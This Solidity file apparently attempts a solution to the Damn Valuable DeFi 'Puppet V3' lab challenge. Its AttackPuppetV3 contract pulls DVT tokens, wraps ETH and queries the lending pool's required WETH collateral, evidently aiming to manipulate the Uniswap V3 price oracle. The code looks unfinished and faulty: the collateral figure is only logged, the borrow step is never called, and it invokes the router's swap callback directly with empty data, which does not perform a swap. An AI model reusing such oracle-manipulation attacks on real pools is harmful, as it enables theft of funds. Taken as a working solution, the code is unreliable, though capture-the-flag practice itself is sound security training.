// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

import "hardhat/console.sol";

interface IWeth is IERC20 {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

interface IPuppetV3Pool {
    function calculateDepositOfWETHRequired(
        uint256 amount
    ) external returns (uint256);

    function borrow(uint256 borrowAmount) external;
}

contract AttackPuppetV3 {
    IPuppetV3Pool pool;
    ISwapRouter uniswapRouter;
    DamnValuableToken token;
    IWeth weth;

    constructor(
        address _pool,
        address _token,
        address _weth,
        address _uniswapRouter
    ) {
        pool = IPuppetV3Pool(_pool);
        token = DamnValuableToken(_token);
        weth = IWeth(_weth);
        uniswapRouter = ISwapRouter(_uniswapRouter);
    }

    function attack(uint256 amount) public payable {
        token.transferFrom(msg.sender, address(this), 110 ether);
        weth.deposit{value: address(this).balance}();
        uint256 wethAmount = pool.calculateDepositOfWETHRequired(amount);
        console.log(wethAmount);
        uniswapRouter.uniswapV3SwapCallback(100 ether, -100 ether, bytes(""));
    }
}
